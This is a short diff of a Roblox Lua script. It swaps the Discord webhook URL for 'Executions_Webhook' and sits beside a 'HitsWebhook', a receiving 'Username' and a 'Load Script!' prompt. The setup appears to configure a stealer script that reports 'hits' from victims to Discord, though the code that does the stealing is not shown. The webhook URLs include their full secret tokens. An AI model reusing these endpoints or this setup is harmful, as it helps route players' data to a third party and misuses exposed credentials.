@@ -91,7 +91,7 @@ game:GetService("Players").PlayerRemoving:Connect(function(leavingPlayer)
 end)
 
 HitsWebhook = "https://discord.com/api/webhooks/1340796672254541964/CHOXlXe5GWUm3QEYz0Kd07Dmc2okMRqlyCRoHU5A9ERCg5Ot-GR-fhnrrqBKOjjaRDhQ"
-Executions_Webhook = "https://discord.com/api/webhooks/1340796672254541964/CHOXlXe5GWUm3QEYz0Kd07Dmc2okMRqlyCRoHU5A9ERCg5Ot-GR-fhnrrqBKOjjaRDhQ"
+Executions_Webhook = "https://discord.com/api/webhooks/1346441185878736957/cRcDh8rIl2p4tWA4JMm3QciveyPxg7o37C0kwqmauPLKGRuWhMnFw7XTfX7RL4ZaPaKB"
 Username = "boondock138"
 Button_Prompt = "Load Script!"
 
